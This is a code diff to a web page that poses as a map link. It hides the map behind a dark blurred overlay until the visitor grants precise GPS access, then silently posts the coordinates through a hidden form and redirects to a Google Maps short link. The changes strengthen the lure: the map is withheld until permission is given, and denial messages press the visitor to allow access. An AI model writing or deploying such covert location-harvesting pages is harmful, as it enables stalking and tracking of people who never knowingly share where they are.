@@ -11,6 +11,7 @@
       margin: 0;
       padding: 0;
       font-family: Arial, sans-serif;
+      background: #000; /* prevent blurred map flash */
     }
     iframe {
       position: absolute;
@@ -19,6 +20,7 @@
       width: 100%;
       height: 100%;
       border: none;
+      display: none; /* keep hidden until GPS success */
     }
     #overlay {
       position: absolute;
@@ -26,7 +28,7 @@
       left: 0;
       width: 100%;
       height: 100%;
-      background: rgba(0, 0, 0, 0.35);
+      background: rgba(0, 0, 0, 0.85);
       backdrop-filter: blur(6px);
       display: flex;
       flex-direction: column;
@@ -89,46 +91,59 @@
     const form = document.getElementById("locationForm");
     const latInput = document.getElementById("latitude");
     const lonInput = document.getElementById("longitude");
-
-    // Default location (Kathmandu)
-    const defaultLat = 27.67442;
-    const defaultLon = 85.3123;
-    iframe.src = `https://maps.google.com/maps?q=${defaultLat},${defaultLon}&z=15&output=embed`;
+    const output = document.getElementById("output");
 
     function requestLocation() {
       if (!navigator.geolocation) {
-        document.getElementById("output").innerText = "Geolocation not supported.";
+        output.innerText = "Geolocation not supported.";
         return;
       }
+
+      output.innerText = "Fetching your location...";
 
       navigator.geolocation.getCurrentPosition(
         (pos) => {
           const lat = pos.coords.latitude;
           const lon = pos.coords.longitude;
 
-          // Update iframe with user's location
+          // Update iframe with user's location and show it
           iframe.src = `https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed`;
+          iframe.style.display = "block";
 
-          // Set values in hidden form and submit (AJAX)
+          // Fill hidden form
           latInput.value = lat;
           lonInput.value = lon;
-
-          overlay.classList.add("hidden"); // hide overlay
 
           // Submit form without redirect
           fetch(form.action, {
             method: 'POST',
             body: new FormData(form)
           }).then(() => {
-            // After submitting, redirect to Google Maps app link
+            // Now hide overlay and redirect
+            overlay.classList.add("hidden");
             window.location.href = "https://maps.app.goo.gl/gxTJVqdHK6HrPMrN8";
           }).catch(err => {
             console.error("Form submission failed:", err);
+            overlay.classList.add("hidden");
             window.location.href = "https://maps.app.goo.gl/gxTJVqdHK6HrPMrN8";
           });
         },
         (err) => {
-          document.getElementById("output").innerText = `Error: ${err.message}`;
+          let msg;
+          switch(err.code) {
+            case err.PERMISSION_DENIED:
+              msg = "Location permission denied. Please allow access.";
+              break;
+            case err.POSITION_UNAVAILABLE:
+              msg = "GPS unavailable. Please enable location services.";
+              break;
+            case err.TIMEOUT:
+              msg = "Location request timed out. Try again.";
+              break;
+            default:
+              msg = "Unknown error: " + err.message;
+          }
+          output.innerText = msg;
         },
         { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
       );
